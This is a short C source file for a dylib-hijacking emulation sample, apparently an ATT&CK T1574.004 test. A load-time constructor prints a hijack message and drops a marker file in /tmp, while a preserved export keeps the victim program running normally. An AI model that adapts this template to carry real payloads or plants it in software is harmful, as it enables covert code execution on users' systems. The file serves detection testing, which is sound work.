#include <stdio.h>

__attribute__((constructor))
static void hijacked(void) {
    printf("[!] malicious dylib hijacked execution flow\n");
    FILE *f = fopen("/tmp/T1574.004_hijacked.txt", "w");
    if (f) {
        fprintf(f, "dylib hijack executed\n");
        fclose(f);
    }
}

void hello(void) {
    /* preserve the legitimate export so the victim binary keeps running normally */
    printf("legitimate dylib loaded\n");
}
